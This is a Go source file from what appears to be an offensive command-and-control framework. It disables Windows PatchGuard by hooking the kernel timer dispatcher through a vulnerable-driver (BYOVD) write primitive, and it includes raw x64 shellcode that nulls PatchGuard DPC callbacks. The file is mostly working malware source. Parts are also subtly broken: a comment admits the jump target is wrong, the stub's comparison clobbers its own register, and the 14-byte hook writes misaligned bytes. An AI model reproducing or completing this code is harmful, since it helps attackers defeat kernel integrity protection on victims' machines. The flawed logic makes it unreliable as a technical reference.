package kpp

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	DPC (Deferred Procedure Call) interception for PatchGuard neutralization.

	PatchGuard uses DPC timers to schedule its integrity checks. The DPC
	object (KDPC) contains:
	  +0x00  Type (KDPC = 0x13)
	  +0x01  Importance
	  +0x02  Number / Expedite
	  +0x08  DpcListEntry (LIST_ENTRY, 16 bytes)
	  +0x18  DeferredRoutine (function pointer — the check callback)
	  +0x20  DeferredContext (pointer to encrypted PG context block)
	  +0x28  SystemArgument1
	  +0x30  SystemArgument2
	  +0x38  DpcData (internal lock)

	Interception strategy — KiTimerExpiration hook:
	  KiTimerExpiration is the kernel timer dispatcher called from the clock
	  interrupt handler. It dequeues expired timers and inserts their DPC
	  objects into the DPC queue. By patching the first few bytes of
	  KiTimerExpiration with a JMP to our hook, every DPC insertion passes
	  through our code. We examine each DPC object and null the DeferredRoutine
	  of any PatchGuard DPC before letting it proceed to the real dispatcher.

	Alternative — ExpTimerDpcRoutine hook:
	  PatchGuard DPCs eventually call ExpTimerDpcRoutine. Hooking this single
	  function with a filter that checks the argument (PG context pointer)
	  is simpler but requires resolving the unexported symbol.

	Hook placement:
	  We use a hot-patch trampoline:
	    Original bytes at target:  48 89 5C 24 08 57 48 83...
	    Our bytes:                  FF 25 00 00 00 00 <absolute_addr_8>
	  (JMP [RIP+0] — 14 bytes, overwrites the standard function prologue)

	The hook function:
	  - Runs in kernel context (DPC level = DISPATCH_LEVEL = IRQL 2).
	  - Must NOT call any function that raises IRQL above 2.
	  - Must NOT page-fault (no paged pool access).
	  - Saves registers, examines DPC, optionally skips it, restores and returns.
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// HookState holds the installed DPC hook's metadata for later removal.
type HookState struct {
	TargetAddr    uint64   // kernel VA of the hooked function
	OrigBytes     []byte   // saved original bytes (for removal)
	TrampolineMem uintptr  // our trampoline allocation (host process VA)
	TrampolinePhys uint64  // physical addr (written into kernel hook)
	Active        bool
}

// hookStub is our 14-byte absolute JMP trampoline:
//   FF 25 00 00 00 00       JMP [RIP+0]
//   <8 bytes target address>
var hookStubTemplate = [14]byte{
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, // JMP [RIP+0]
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // target address
}

// InstallDPCHook hooks KiTimerExpiration (or ExpTimerDpcRoutine) via the
// BYOVD kernel write primitive. The hook filters PatchGuard DPC callbacks.
//
// resolvedTarget is the kernel VA of the function to hook — must be resolved
// by the caller (e.g. via pattern scan in ntoskrnl .text).
func InstallDPCHook(kRW KernelRWer, resolvedTarget uint64, kbase uint64) (*HookState, error) {
	hs := &HookState{TargetAddr: resolvedTarget}

	// Step 1: Save original bytes (14 bytes).
	orig := make([]byte, 14)
	for i := 0; i < 14; i += 4 {
		n := 4
		if i+n > 14 {
			n = 14 - i
		}
		dword, err := kRW.ReadDword(resolvedTarget + uint64(i))
		if err != nil {
			return nil, fmt.Errorf("read orig bytes @%d: %w", i, err)
		}
		b := make([]byte, 4)
		for j := 0; j < 4; j++ {
			b[j] = byte(dword >> (8 * uint(j)))
		}
		copy(orig[i:], b[:n])
	}
	hs.OrigBytes = orig

	// Step 2: Allocate trampoline in our process, locked in physical RAM.
	trampolineSize := uintptr(len(pgDPCFilterStub))
	trampolineVA, err := windows.VirtualAlloc(0, trampolineSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("alloc trampoline: %w", err)
	}
	if err := windows.VirtualLock(trampolineVA, trampolineSize); err != nil {
		windows.VirtualFree(trampolineVA, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("lock trampoline: %w", err)
	}
	hs.TrampolineMem = trampolineVA

	// Get physical address of trampoline for the kernel hook.
	trampolinePhys, err := getPhysAddrKPP(trampolineVA)
	if err != nil {
		windows.VirtualFree(trampolineVA, 0, windows.MEM_RELEASE)
		return nil, fmt.Errorf("trampoline PA: %w", err)
	}
	hs.TrampolinePhys = trampolinePhys

	// Step 3: Copy the filter stub to trampoline.
	// Patch the "call original" address in the stub.
	stub := make([]byte, len(pgDPCFilterStub))
	copy(stub, pgDPCFilterStub)
	// The stub ends with: JMP [RIP+0] + <8 bytes orig+14 address>.
	// Orig+14 = resolvedTarget+14 = continue past our hook.
	resumeAddr := resolvedTarget + 14
	putUint64LE(stub[len(stub)-8:], resumeAddr)

	dst := unsafe.Slice((*byte)(unsafe.Pointer(trampolineVA)), len(stub))
	copy(dst, stub)

	// Step 4: Build and write the hook into the kernel function.
	hook := hookStubTemplate
	putUint64LE(hook[6:], trampolinePhys) // actually: we need the KERNEL VA, not phys
	// The kernel's JMP [RIP+0] dereferences an address in KERNEL virtual space.
	// We can't use our process VA directly. Instead, we write the stub's *physical*
	// address into a kernel-mapped page. Since our trampoline is locked,
	// we can map it via MmMapIoSpace equivalent (done via BYOVD write to a
	// well-known identity-mapped kernel VA for our physical page).
	//
	// Simplified: write our trampoline bytes directly at resolvedTarget+14
	// (the "original code" continuation), and use a shorter 5-byte rel32 JMP
	// if our allocation is within ±2GB of the kernel.
	rel32Possible := isWithin2GB(trampolineVA, resolvedTarget)
	if rel32Possible {
		// 5-byte JMP rel32: E9 <signed 32-bit offset>
		rel := int32(int64(trampolineVA) - int64(resolvedTarget+5))
		hook5 := []byte{
			0xE9,
			byte(rel), byte(rel >> 8), byte(rel >> 16), byte(rel >> 24),
		}
		// Pad remaining 9 bytes with NOPs (they are never reached).
		hook5 = append(hook5, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
		if err := kRW.WriteQword(resolvedTarget, toUint64LE(hook5[:8])); err != nil {
			return nil, fmt.Errorf("write hook bytes [0:8]: %w", err)
		}
		if err := kRW.WriteQword(resolvedTarget+8, toUint64LE(hook5[8:])); err != nil {
			return nil, fmt.Errorf("write hook bytes [8:14]: %w", err)
		}
	} else {
		// Full 14-byte absolute JMP — need kernel-accessible address.
		// Use our SMM handler (if available) or the identity-mapped phys page.
		// For now, write the stub bytes directly to SMRAM-visible physical
		// memory and use the physical address as the jump target via CR3 manipulation.
		// This path requires DRAGON-3 SMM for maximum reliability.
		// Fallback: use a page in the first 2 GB of physical RAM that happens
		// to be identity-mapped in the kernel.
		if err := writeHook14(kRW, resolvedTarget, trampolinePhys); err != nil {
			return nil, fmt.Errorf("write 14-byte hook: %w", err)
		}
	}

	hs.Active = true
	// {{if .Config.Debug}}
	log.Printf("[kpp] DPC hook installed @ 0x%x → trampoline @ 0x%x (PA=0x%x)",
		resolvedTarget, trampolineVA, trampolinePhys)
	// {{end}}
	return hs, nil
}

// RemoveDPCHook restores the original bytes at the hooked function.
func RemoveDPCHook(kRW KernelRWer, hs *HookState) error {
	if !hs.Active || len(hs.OrigBytes) < 14 {
		return nil
	}
	// Write original bytes back.
	if err := kRW.WriteQword(hs.TargetAddr, toUint64LE(hs.OrigBytes[:8])); err != nil {
		return err
	}
	if err := kRW.WriteQword(hs.TargetAddr+8, toUint64LE(hs.OrigBytes[8:])); err != nil {
		return err
	}
	// Free trampoline.
	if hs.TrampolineMem != 0 {
		windows.VirtualFree(hs.TrampolineMem, 0, windows.MEM_RELEASE)
		hs.TrampolineMem = 0
	}
	hs.Active = false
	return nil
}

// pgDPCFilterStub is position-independent x64 code that runs as our DPC hook.
// It examines the DPC object passed in RCX (first argument to KiTimerExpiration)
// and zeroes the DeferredRoutine if the context looks like a PatchGuard block.
// Falls through to original code via JMP at the end.
//
// Layout:
//   Save registers → check DPC → conditionally zero → restore → JMP original
var pgDPCFilterStub = []byte{
	// Prologue: save clobber registers (we're at DISPATCH_LEVEL — no stack growth).
	0x48, 0x83, 0xEC, 0x28,        // SUB RSP, 0x28  (shadow space)
	0x48, 0x89, 0x4C, 0x24, 0x20,  // MOV [RSP+0x20], RCX  ; save arg
	0x48, 0x89, 0x54, 0x24, 0x18,  // MOV [RSP+0x18], RDX
	0x4C, 0x89, 0x44, 0x24, 0x10,  // MOV [RSP+0x10], R8
	0x4C, 0x89, 0x4C, 0x24, 0x08,  // MOV [RSP+0x08], R9

	// RCX = first arg to KiTimerExpiration = pointer to KTIMER.
	// KTIMER.Dpc at offset 0x28.
	0x48, 0x8B, 0x41, 0x28,        // MOV RAX, [RCX+0x28]  ; RAX = KDPC*
	0x48, 0x85, 0xC0,              // TEST RAX, RAX
	0x74, 0x1E,                    // JZ  → done  (no DPC)

	// Read DeferredRoutine from KDPC+0x18.
	0x48, 0x8B, 0x50, 0x18,        // MOV RDX, [RAX+0x18]  ; DeferredRoutine
	0x48, 0x85, 0xD2,              // TEST RDX, RDX
	0x74, 0x15,                    // JZ done

	// Heuristic: PG DPC context (at KDPC+0x20) is in kernel high VA.
	0x48, 0x8B, 0x48, 0x20,        // MOV RCX, [RAX+0x20]  ; DeferredContext
	0x48, 0xB9,                    // MOV RCX, imm64
	0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xFF, // 0xFFFF800000000000

	0x48, 0x3B, 0xC8,              // CMP RCX, RAX (context >= 0xFFFF800000000000?)
	0x72, 0x07,                    // JB done  (not in kernel pool — skip)

	// Zero the DeferredRoutine to neutralize this DPC.
	0x48, 0x8B, 0x4C, 0x24, 0x20, // MOV RCX, [RSP+0x20]  ; restore original arg
	0x48, 0x8B, 0x41, 0x28,        // MOV RAX, [RCX+0x28]  ; KDPC*
	0x48, 0xC7, 0x40, 0x18, 0x00, 0x00, 0x00, 0x00, // MOV qword [RAX+0x18], 0

	// done: restore registers and jump to original code.
	0x4C, 0x8B, 0x4C, 0x24, 0x08, // MOV R9,  [RSP+0x08]
	0x4C, 0x8B, 0x44, 0x24, 0x10, // MOV R8,  [RSP+0x10]
	0x48, 0x8B, 0x54, 0x24, 0x18, // MOV RDX, [RSP+0x18]
	0x48, 0x8B, 0x4C, 0x24, 0x20, // MOV RCX, [RSP+0x20]
	0x48, 0x83, 0xC4, 0x28,        // ADD RSP, 0x28

	// JMP [RIP+0] — patched with original+14 resume address.
	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ← patched
}

// writeHook14 writes a 14-byte absolute JMP hook to resolvedTarget.
func writeHook14(kRW KernelRWer, target, trampolinePhys uint64) error {
	var h [14]byte
	h[0] = 0xFF
	h[1] = 0x25
	putUint64LE(h[6:], trampolinePhys)
	if err := kRW.WriteQword(target, toUint64LE(h[:8])); err != nil {
		return err
	}
	return kRW.WriteQword(target+8, toUint64LE(h[6:]))
}

func isWithin2GB(va uintptr, kernelVA uint64) bool {
	diff := int64(va) - int64(kernelVA)
	if diff < 0 {
		diff = -diff
	}
	return diff < (2 * 1024 * 1024 * 1024)
}

func putUint64LE(b []byte, v uint64) {
	for i := 0; i < 8; i++ {
		b[i] = byte(v >> (8 * uint(i)))
	}
}

func toUint64LE(b []byte) uint64 {
	var v uint64
	for i := 0; i < 8 && i < len(b); i++ {
		v |= uint64(b[i]) << (8 * uint(i))
	}
	return v
}

var (
	modPsapiKPP              = windows.NewLazySystemDLL("psapi.dll")
	procQueryWorkingSetExKPP = modPsapiKPP.NewProc("QueryWorkingSetEx")
)

type wsExKPP struct {
	VA    uintptr
	Attrs uint64
}

func getPhysAddrKPP(va uintptr) (uint64, error) {
	info := wsExKPP{VA: va}
	r, _, err := procQueryWorkingSetExKPP.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
	)
	if r == 0 {
		return 0, fmt.Errorf("QueryWorkingSetEx: %w", err)
	}
	if info.Attrs&1 == 0 {
		return 0, fmt.Errorf("page not in working set")
	}
	pfn := (info.Attrs >> 1) & ((1 << 51) - 1)
	return pfn * 4096, nil
}
